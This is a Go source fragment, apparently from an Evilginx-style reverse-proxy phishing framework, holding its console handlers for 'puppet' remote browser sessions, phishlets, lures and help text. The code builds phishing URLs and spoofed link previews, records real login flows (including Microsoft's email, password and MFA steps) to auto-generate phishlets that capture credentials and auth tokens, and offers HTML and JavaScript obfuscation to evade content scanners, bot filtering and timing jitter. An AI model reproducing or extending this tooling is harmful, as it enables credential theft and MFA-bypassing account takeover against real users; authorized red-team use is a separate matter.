			log.Info("killed %d puppet(s)", killed)
			return nil
		}
		puppetId, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid puppet id: %s", args[1])
		}
		if err := t.puppet.KillPuppet(puppetId); err != nil {
			return err
		}
		log.Info("puppet %d killed", puppetId)
		return nil

	case "url":
		if pn < 2 {
			return fmt.Errorf("usage: puppet url <puppet_id>")
		}
		puppetId, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid puppet id: %s", args[1])
		}
		puppet, ok := t.puppet.GetPuppet(puppetId)
		if !ok {
			return fmt.Errorf("puppet %d not found", puppetId)
		}
		controlURL := t.puppet.GetControlURL(puppetId)
		log.Info("")
		log.Info("  %s %s", white.Sprint("puppet:"), cyan.Sprint("#"+strconv.Itoa(puppet.Id)))
		log.Info("  %s %s", white.Sprint("status:"), higreen.Sprint(puppet.Status.String()))
		log.Info("  %s %s", white.Sprint("control:"), yellow.Sprint(controlURL))
		log.Info("")
		log.Info("  %s", dgray.Sprint("open the URL above in your browser to remote-control the session"))
		return nil

	case "port":
		if pn < 2 {
			log.Info("puppet server port: %s", cyan.Sprint(strconv.Itoa(t.puppet.GetPort())))
			return nil
		}
		port, err := strconv.Atoi(args[1])
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("invalid port number: %s", args[1])
		}
		t.puppet.SetPort(port)
		log.Info("puppet server port set to %s (restart puppet server to apply)", cyan.Sprint(strconv.Itoa(port)))
		return nil

	case "password":
		if pn < 2 {
			log.Info("puppet access password: %s", cyan.Sprint(t.puppet.GetPassword()))
			return nil
		}
		t.puppet.SetPassword(args[1])
		log.Info("puppet access password set to: %s", cyan.Sprint(args[1]))
		return nil

	case "chrome":
		if pn < 2 {
			return fmt.Errorf("usage: puppet chrome <path_to_chrome>")
		}
		t.puppet.SetChromePath(args[1])
		log.Info("chrome path set to: %s", cyan.Sprint(args[1]))
		return nil
	}

	return fmt.Errorf("usage: puppet [launch|list|kill|url|port|password|chrome] (see: help puppet)")
}

func (t *Terminal) handlePhishlets(args []string) error {
	pn := len(args)

	// Handle analyze subcommand (any arg count)
	if pn >= 1 && args[0] == "analyze" {
		return t.handleAnalyze(args[1:])
	}

	if pn >= 3 && args[0] == "create" {
		pl, err := t.cfg.GetPhishlet(args[1])
		if err == nil {
			params := make(map[string]string)

			var create_ok bool = true
			if pl.isTemplate {
				for n := 3; n < pn; n++ {
					val := args[n]

					sp := strings.Index(val, "=")
					if sp == -1 {
						return fmt.Errorf("set custom parameters for the child phishlet using format 'param1=value1 param2=value2'")
					}
					k := val[:sp]
					v := val[sp+1:]

					params[k] = v

					log.Info("adding parameter: %s='%s'", k, v)
				}
			}

			if create_ok {
				child_name := args[1] + ":" + args[2]
				err := t.cfg.AddSubPhishlet(child_name, args[1], params)
				if err != nil {
					log.Error("%v", err)
				} else {
					t.cfg.SaveSubPhishlets()
					log.Info("created child phishlet: %s", child_name)
				}
			}
			return nil
		} else {
			log.Error("%v", err)
		}
	} else if pn == 0 {
		t.output("%s", t.sprintPhishletStatus(""))
		return nil
	} else if pn == 1 {
		_, err := t.cfg.GetPhishlet(args[0])
		if err == nil {
			t.output("%s", t.sprintPhishletStatus(args[0]))
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			err := t.cfg.DeleteSubPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				return nil
			}
			t.cfg.SaveSubPhishlets()
			log.Info("deleted child phishlet: %s", args[1])
			return nil
		case "enable":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				break
			}
			if pl.isTemplate {
				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
			}

			// Auto-set hostname if not already configured
			if h, ok := t.cfg.GetSiteDomain(args[1]); !ok || h == "" {
				baseDomain := t.cfg.GetBaseDomain()
				if baseDomain == "" {
					return fmt.Errorf("set your base domain first: config domain <yourdomain.com>")
				}
				// Find the landing proxy host's phish_sub to build the hostname
				landingSub := ""
				for _, ph := range pl.proxyHosts {
					if ph.is_landing {
						landingSub = ph.phish_subdomain
						break
					}
				}
				if landingSub != "" {
					autoHostname := landingSub + "." + baseDomain
					log.Info("auto-setting hostname: %s", autoHostname)
					t.cfg.SetSiteHostname(args[1], autoHostname)
				} else {
					t.cfg.SetSiteHostname(args[1], baseDomain)
				}
			}

			err = t.cfg.SetSiteEnabled(args[1])
			if err != nil {
				t.cfg.SetSiteDisabled(args[1])
				return err
			}
			t.manageCertificates(true)
			return nil
		case "disable":
			err := t.cfg.SetSiteDisabled(args[1])
			if err != nil {
				return err
			}
			t.manageCertificates(false)
			return nil
		case "hide":
			err := t.cfg.SetSiteHidden(args[1], true)
			if err != nil {
				return err
			}
			return nil
		case "unhide":
			err := t.cfg.SetSiteHidden(args[1], false)
			if err != nil {
				return err
			}
			return nil
		case "get-hosts":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Name)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			out := ""
			hosts := pl.GetPhishHosts(false)
			for n, h := range hosts {
				if n > 0 {
					out += "\n"
				}
				out += t.cfg.GetServerExternalIP() + " " + h
			}
			t.output("%s\n", out)
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "hostname":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
				t.cfg.SetSiteDisabled(args[1])
				t.manageCertificates(false)
			}
			return nil
		case "unauth_url":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetSiteUnauthUrl(args[1], args[2])
			return nil
		case "domain":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetPhishletDomain(args[1], args[2])
			t.cfg.SetSiteDisabled(args[1])
			t.manageCertificates(false)
			return nil
		case "proxy":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetPhishletProxy(args[1], args[2])
			return nil
		}
	}
	return fmt.Errorf("usage: phishlets [hostname|enable|disable|hide|unhide|get-hosts|domain|proxy|analyze] <name> (see: help phishlets)")
}

func (t *Terminal) handleAnalyze(args []string) error {
	cyan := color.New(color.FgCyan)
	higreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	_ = cyan
	_ = higreen
	_ = yellow

	if t.analyzer == nil {
		return fmt.Errorf("analyzer not available (puppet system not initialized)")
	}

	if len(args) == 0 {
		// Show all active analyzer sessions
		sessions := t.analyzer.GetActiveSessions()
		if len(sessions) == 0 {
			log.Info("no active analyzer sessions")
			log.Info("start one with: %s", cyan.Sprint("phishlets analyze <login_url>"))
			return nil
		}
		for _, s := range sessions {
			log.Info("[%d] %s — %s (duration: %s)", s.Id, s.TargetURL, s.Status, time.Since(s.StartTime).Round(time.Second))
		}
		return nil
	}

	switch args[0] {
	case "stop":
		// Stop the most recent active session (or specific ID if given)
		var targetId int
		if len(args) >= 2 {
			id, err := strconv.Atoi(args[1])
			if err != nil {
				return fmt.Errorf("invalid session ID: %s", args[1])
			}
			targetId = id
		} else {
			// Find the most recent recording session
			sessions := t.analyzer.GetActiveSessions()
			found := false
			for _, s := range sessions {
				if s.Status == "recording" {
					targetId = s.Id
					found = true
				}
			}
			if !found {
				return fmt.Errorf("no active analyzer session to stop")
			}
		}

		sess, err := t.analyzer.StopAnalysis(targetId)
		if err != nil {
			return err
		}

		log.Info("analyzing captured data...")
		result := t.analyzer.Analyze(sess)

		// Generate YAML
		yaml := t.analyzer.GenerateYAML(result)

		// Determine phishlet name from landing domain
		name := "analyzed"
		if result.LandingDomain != "" {
			parts := strings.Split(result.LandingDomain, ".")
			if len(parts) >= 2 {
				name = parts[len(parts)-2]
			}
		}

		// Allow user to override name if provided
		if len(args) >= 3 {
			name = args[2]
		}

		// Save to phishlets directory
		savePath := ""
		if t.phishletsDir != "" {
			savePath = filepath.Join(t.phishletsDir, name+".yaml")
		} else {
			savePath = name + ".yaml"
		}

		err = os.WriteFile(savePath, []byte(yaml), 0644)
		if err != nil {
			log.Error("failed to save phishlet: %v", err)
			log.Info("generated YAML:\n%s", yaml)
			return nil
		}

		log.Success("phishlet saved to: %s", higreen.Sprint(savePath))

		// Auto-load the new phishlet so the user can enable it immediately
		pl, loadErr := NewPhishlet(name, savePath, nil, t.cfg)
		if loadErr != nil {
			log.Warning("could not auto-load phishlet: %v", loadErr)
			log.Info("restart evilginx to load it, then:")
			log.Info("  %s", cyan.Sprint("phishlets enable "+name))
		} else {
			// Remove existing phishlet with same name if present (re-analysis)
			existingNames := t.cfg.GetPhishletNames()
			alreadyExists := false
			for _, n := range existingNames {
				if n == name {
					alreadyExists = true
					break
				}
			}
			if !alreadyExists {
				t.cfg.AddPhishlet(name, pl)
			}
			log.Success("phishlet '%s' loaded — you can enable it now:", name)
			log.Info("  %s", cyan.Sprint("phishlets enable "+name))
		}

		// Show summary
		log.Info("")
		log.Info("analysis summary:")
		log.Info("  proxy_hosts:  %d domains", len(result.ProxyHosts))
		log.Info("  auth_tokens:  %d groups", len(result.AuthTokens))
		log.Info("  credentials:  %d fields detected", len(result.Credentials))
		log.Info("  login path:   %s%s", result.LoginDomain, result.LoginPath)
		log.Info("  sub_filters:  %d rules", len(result.SubFilters))

		hasUsername := false
		hasPassword := false
		for _, c := range result.Credentials {
			if c.Name == "username" {
				hasUsername = true
			}
			if c.Name == "password" {
				hasPassword = true
			}
		}

		if len(result.Credentials) == 0 {
			log.Warning("no credential fields were auto-detected — you may need to edit the YAML manually")
			log.Info("  tip: make sure you complete the FULL login flow (enter email AND password)")
			log.Info("  the analyzer captures POST fields as you submit them")
		} else if hasUsername && !hasPassword {
			log.Warning("only username was detected — password field is missing")
			log.Info("  tip: you need to complete the FULL login flow including the password step")
			log.Info("  Microsoft uses a multi-step flow: email → password → MFA")
			log.Info("  re-run the analyzer and enter a test password to capture the 'passwd' field")
		} else if !hasUsername && hasPassword {
			log.Warning("only password was detected — username field is missing")
			log.Info("  tip: make sure you enter the email/username before submitting")
		}

		return nil

	case "status":
		var targetId int
		if len(args) >= 2 {
			id, err := strconv.Atoi(args[1])
			if err != nil {
				return fmt.Errorf("invalid session ID: %s", args[1])
			}
			targetId = id
		} else {
			sessions := t.analyzer.GetActiveSessions()
			found := false
			for _, s := range sessions {
				if s.Status == "recording" {
					targetId = s.Id
					found = true
				}
			}
			if !found {
				return fmt.Errorf("no active analyzer session")
			}
		}

		sess, ok := t.analyzer.GetSession(targetId)
		if !ok {
			return fmt.Errorf("analyzer session %d not found", targetId)
		}

		summary := t.analyzer.GetStatusSummary(sess)
		t.output("\n%s\n", summary)
		return nil

	default:
		// args[0] is the URL to analyze
		targetURL := args[0]
		sess, err := t.analyzer.StartAnalysis(targetURL)
		if err != nil {
			return err
		}

		log.Success("analyzer session [%d] started for: %s", sess.Id, targetURL)
		log.Info("open the puppet control URL in your browser to interact with the login page")
		log.Info("")
		log.Info("%s  complete the FULL login flow:", yellow.Sprint("important:"))
		log.Info("  1. enter a username/email and click Next")
		log.Info("  2. enter a password and click Sign In")
		log.Info("  3. complete any MFA prompts if shown")
		log.Info("  the analyzer captures credential fields as you submit each step")
		log.Info("")
		log.Info("when done: %s", cyan.Sprint("phishlets analyze stop"))
		log.Info("check progress: %s", cyan.Sprint("phishlets analyze status"))
		return nil
	}
}

func (t *Terminal) handleLures(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	green := color.New(color.FgGreen)
	//hiwhite := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgHiBlack)
	white := color.New(color.FgHiWhite)

	pn := len(args)

	if pn == 0 {
		// list lures
		t.output("%s", t.sprintLures())
		return nil
	}
	if pn > 0 {
		switch args[0] {
		case "create":
			if pn == 2 {
				_, err := t.cfg.GetPhishlet(args[1])
				if err != nil {
					return err
				}
				l := &Lure{
					Path:     "/" + GenRandomString(8),
					Phishlet: args[1],
				}
				t.cfg.AddLure(args[1], l)
				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "get-url":
			if pn >= 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				pl, err := t.cfg.GetPhishlet(l.Phishlet)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
				if !ok || len(bhost) == 0 {
					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
				}

				var base_url string
				if l.Hostname != "" {
					base_url = "https://" + l.Hostname + l.Path
				} else {
					purl, err := pl.GetLureUrl(l.Path)
					if err != nil {
						return err
					}
					base_url = purl
				}

				var phish_urls []string
				var phish_params []map[string]string
				var out string

				params := url.Values{}
				if pn > 2 {
					if args[2] == "import" {
						if pn < 4 {
							return fmt.Errorf("get-url: no import path specified")
						}
						params_file := args[3]

						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
						if err != nil {
							return fmt.Errorf("get_url: %v", err)
						}

						if pn >= 5 {
							if args[4] == "export" {
								if pn == 5 {
									return fmt.Errorf("get-url: no export path specified")
								}
								export_path := args[5]

								format := "text"
								if pn == 7 {
									format = args[6]
								}

								err = t.exportPhishUrls(export_path, phish_urls, phish_params, format)
								if err != nil {
									return fmt.Errorf("get-url: %v", err)
								}
								out = hiblue.Sprintf("exported %d phishing urls to file: %s\n", len(phish_urls), export_path)
								phish_urls = []string{}
							} else {
								return fmt.Errorf("get-url: expected 'export': %s", args[4])
							}
						}

					} else {
						// params present
						for n := 2; n < pn; n++ {
							val := args[n]

							sp := strings.Index(val, "=")
							if sp == -1 {
								return fmt.Errorf("to set custom parameters for the phishing url, use format 'param1=value1 param2=value2'")
							}
							k := val[:sp]
							v := val[sp+1:]

							params.Add(k, v)

							log.Info("adding parameter: %s='%s'", k, v)
						}
						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
					}
				} else {
					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
				}

				for n, phish_url := range phish_urls {
					out += hiblue.Sprint(phish_url)

					var params_row string
					var params string
					if len(phish_params) > 0 {
						params_row := phish_params[n]
						m := 0
						for k, v := range params_row {
							if m > 0 {
								params += " "
							}
							params += fmt.Sprintf("%s=\"%s\"", k, v)
							m += 1
						}
					}

					if len(params_row) > 0 {
						out += " ; " + params
					}
					out += "\n"
				}

				t.output("%s", out)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "pause":
			if pn == 3 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				s_duration := args[2]

				t_dur, err := ParseDurationString(s_duration)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				t_now := time.Now()
				log.Info("current time: %s", t_now.Format("2006-01-02 15:04:05"))
				log.Info("unpauses at:  %s", t_now.Add(t_dur).Format("2006-01-02 15:04:05"))

				l.PausedUntil = t_now.Add(t_dur).Unix()
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "unpause":
			if pn == 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}

				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)

				l.PausedUntil = 0
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "edit":
			if pn == 4 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				val := args[3]
				do_update := false

				switch args[2] {
				case "hostname":
					if val != "" {
						val = strings.ToLower(val)

						if val != t.cfg.general.Domain && !strings.HasSuffix(val, "."+t.cfg.general.Domain) {
							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.general.Domain)
						}
						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
						if !host_re.MatchString(val) {
							return fmt.Errorf("edit: invalid hostname")
						}

						l.Hostname = val
						t.cfg.refreshActiveHostnames()
						t.manageCertificates(true)
					} else {
						l.Hostname = ""
					}
					do_update = true
					log.Info("hostname = '%s'", l.Hostname)
				case "path":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						l.Path = u.EscapedPath()
						if len(l.Path) == 0 || l.Path[0] != '/' {
							l.Path = "/" + l.Path
						}
					} else {
						l.Path = "/"
					}
					do_update = true
					log.Info("path = '%s'", l.Path)
				case "redirect_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: redirect url must be absolute")
						}
						l.RedirectUrl = u.String()
					} else {
						l.RedirectUrl = ""
					}
					do_update = true
					log.Info("redirect_url = '%s'", l.RedirectUrl)
				case "phishlet":
					_, err := t.cfg.GetPhishlet(val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					l.Phishlet = val
					do_update = true
					log.Info("phishlet = '%s'", l.Phishlet)
				case "info":
					l.Info = val
					do_update = true
					log.Info("info = '%s'", l.Info)
				case "og_title":
					l.OgTitle = val
					do_update = true
					log.Info("og_title = '%s'", l.OgTitle)
				case "og_desc":
					l.OgDescription = val
					do_update = true
					log.Info("og_desc = '%s'", l.OgDescription)
				case "og_image":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: image url must be absolute")
						}
						l.OgImageUrl = u.String()
					} else {
						l.OgImageUrl = ""
					}
					do_update = true
					log.Info("og_image = '%s'", l.OgImageUrl)
				case "og_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: site url must be absolute")
						}
						l.OgUrl = u.String()
					} else {
						l.OgUrl = ""
					}
					do_update = true
					log.Info("og_url = '%s'", l.OgUrl)
				case "redirector":
					if val != "" {
						path := val
						if !filepath.IsAbs(val) {
							redirectors_dir := t.cfg.GetRedirectorsDir()
							path = filepath.Join(redirectors_dir, val)
						}

						if _, err := os.Stat(path); !os.IsNotExist(err) {
							l.Redirector = val
						} else {
							return fmt.Errorf("edit: redirector directory does not exist: %s", path)
						}
					} else {
						l.Redirector = ""
					}
					do_update = true
					log.Info("redirector = '%s'", l.Redirector)
				case "ua_filter":
					if val != "" {
						if _, err := regexp.Compile(val); err != nil {
							return err
						}

						l.UserAgentFilter = val
					} else {
						l.UserAgentFilter = ""
					}
					do_update = true
					log.Info("ua_filter = '%s'", l.UserAgentFilter)
				case "proxy":
					if val != "" {
						if _, err := t.cfg.GetNamedProxy(val); err != nil {
							return fmt.Errorf("edit: proxy '%s' not found", val)
						}
						l.Proxy = val
					} else {
						l.Proxy = ""
					}
					do_update = true
					log.Info("proxy = '%s'", l.Proxy)
				}
				if do_update {
					err := t.cfg.SetLure(l_id, l)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					return nil
				}
			} else {
				return fmt.Errorf("incorrect number of arguments")
			}
		case "delete":
			if pn == 2 {
				if len(t.cfg.lures) == 0 {
					break
				}
				if args[1] == "all" {
					di := []int{}
					for n := range t.cfg.lures {
						di = append(di, n)
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				} else {
					rc := strings.Split(args[1], ",")
					di := []int{}
					for _, pc := range rc {
						pc = strings.TrimSpace(pc)
						rd := strings.Split(pc, "-")
						if len(rd) == 2 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							for i := b_id; i <= e_id; i++ {
								di = append(di, i)
							}
						} else if len(rd) == 1 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							di = append(di, b_id)
						}
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				}
			}
			return fmt.Errorf("incorrect number of arguments")
		default:
			id, err := strconv.Atoi(args[0])
			if err != nil {
				return err
			}
			l, err := t.cfg.GetLure(id)
			if err != nil {
				return err
			}

			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
			log.Printf("\n%s\n", AsRows(keys, vals))

			return nil
		}
	}

	return fmt.Errorf("usage: lures [create|edit|delete|get-url|pause] (see: help lures)")
}

func (t *Terminal) monitorLurePause() {
	var pausedLures map[string]int64
	pausedLures = make(map[string]int64)

	for {
		t_cur := time.Now()

		for n, l := range t.cfg.lures {
			if l.PausedUntil > 0 {
				l_id := t.cfg.lureIds[n]
				t_pause := time.Unix(l.PausedUntil, 0)
				if t_pause.After(t_cur) {
					pausedLures[l_id] = l.PausedUntil
				} else {
					if _, ok := pausedLures[l_id]; ok {
						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
					}
					pausedLures[l_id] = 0
					l.PausedUntil = 0
				}
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("obfuscation", readline.PcItem("javascript", readline.PcItem("off"), readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high")), readline.PcItem("html", readline.PcItem("on"), readline.PcItem("off"))),
			readline.PcItem("spoof", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("spoof_url"),
			readline.PcItem("botguard", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("jitter", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("enc_key"), readline.PcItem("server_name"),
			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
	h.AddSubCommand("config", nil, "", "show all configuration variables")
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
	h.AddSubCommand("config", []string{"obfuscation", "javascript"}, "obfuscation javascript <off|low|medium|high>", "set JS obfuscation level (low=rename vars, medium=+string encoding, high=+dead code)")
	h.AddSubCommand("config", []string{"obfuscation", "html"}, "obfuscation html <on|off>", "base64-encode HTML body with a JS decoder stub to evade content scanners")
	h.AddSubCommand("config", []string{"spoof"}, "spoof <on|off>", "serve a spoofed website to unauthorized visitors instead of redirecting them")
	h.AddSubCommand("config", []string{"spoof_url"}, "spoof_url <url>", "URL of the legitimate site to reverse-proxy for unauthorized visitors (e.g. https://example.com)")
	h.AddSubCommand("config", []string{"botguard"}, "botguard <on|off>", "enable/disable bot detection (see 'help botguard' for detailed options)")
	h.AddSubCommand("config", []string{"jitter"}, "jitter <on|off>", "add 100-300ms random delay on outbound requests (timing evasion)")
	h.AddSubCommand("config", []string{"enc_key"}, "enc_key <key>", "set AES-256 encryption key (min 32 chars) for lure URLs. WARNING: changing this breaks existing URLs!")
	h.AddSubCommand("config", []string{"server_name"}, "server_name <name>", "set server name shown in notification messages")
	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")

	h.AddCommand("proxy", "general", "manage proxy configuration", "Route traffic through proxies. Supports a global proxy and named profiles.\n\n  Named proxies can be assigned per-phishlet or per-lure for independent routing.\n  Supported types: http, https, socks5, socks5h\n\n  Quick start (named proxy):\n    proxy create us-east\n    proxy set us-east type socks5h\n    proxy set us-east address 10.0.0.1\n    proxy set us-east port 1080\n    proxy test us-east\n    phishlets proxy mysite us-east", LAYER_TOP,
		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password"),
			readline.PcItem("create"), readline.PcItem("delete"), readline.PcItem("list"), readline.PcItem("set"), readline.PcItem("test")))
	h.AddSubCommand("proxy", nil, "", "show global proxy configuration and named proxies")
	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable global proxy")
	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable global proxy")
	h.AddSubCommand("proxy", []string{"type"}, "type <type>", "set global proxy type: http (default), https, socks5, socks5h")
	h.AddSubCommand("proxy", []string{"address"}, "address <address>", "set global proxy address")
	h.AddSubCommand("proxy", []string{"port"}, "port <port>", "set global proxy port")
	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set global proxy authentication username")
	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set global proxy authentication password")
	h.AddSubCommand("proxy", []string{"create"}, "create <name>", "create a new named proxy profile")
	h.AddSubCommand("proxy", []string{"delete"}, "delete <name>", "delete a named proxy profile")
	h.AddSubCommand("proxy", []string{"list"}, "list", "list all named proxy profiles")
	h.AddSubCommand("proxy", []string{"set"}, "set <name> <key> <value>", "configure a named proxy (keys: type, address, port, username, password)")
	h.AddSubCommand("proxy", []string{"test"}, "test <name>", "test connectivity through a named proxy")

	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("domain", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("proxy", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("analyze", readline.PcItem("stop"), readline.PcItem("status"))))
	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
